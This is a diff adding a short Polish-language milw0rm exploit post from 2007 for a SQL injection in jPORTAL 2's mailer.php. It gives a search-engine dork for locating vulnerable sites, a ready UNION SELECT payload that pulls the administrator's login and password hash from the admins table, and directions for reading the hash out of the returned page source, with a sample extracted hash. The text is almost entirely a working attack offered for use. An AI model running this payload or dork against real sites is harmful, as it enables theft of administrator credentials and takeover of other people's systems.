@@ -1,0 +1,22 @@
+Tytul: jPORTAL 2 Remote SQL Injection Vulnerability
+dork:[ intext:"jPORTAL 2" & inurl:"mailer.php" ]
+
+Autor: Kacper
+E-Mail: kacper1964@yahoo.pl
+Strona: devilteam.eu
+
+Irc: irc.myg0t.com #devilteam
+
+Blad:
+
+mailer.php?to=999999999999'+union+select+0,1,2,3,4,5,concat(nick,char(58),pass),7+from+admins+limit+1/*
+
+po wykonaniu zapytania wystarczy zajrzec w xrodlo strony i poszukac:
+
+<input type="hidden" name="cmd" value="sendmail"><input type="hidden" name="to" value="admin:9b3a80a898fabc984e733d904027cc91"></td>
+
+value="admin:9b3a80a898fabc984e733d904027cc91" < ----/  to Twoj rezultat wykonania zapytania SQL.
+
+be safe all  :) 
+
+# milw0rm.com [2007-11-06]
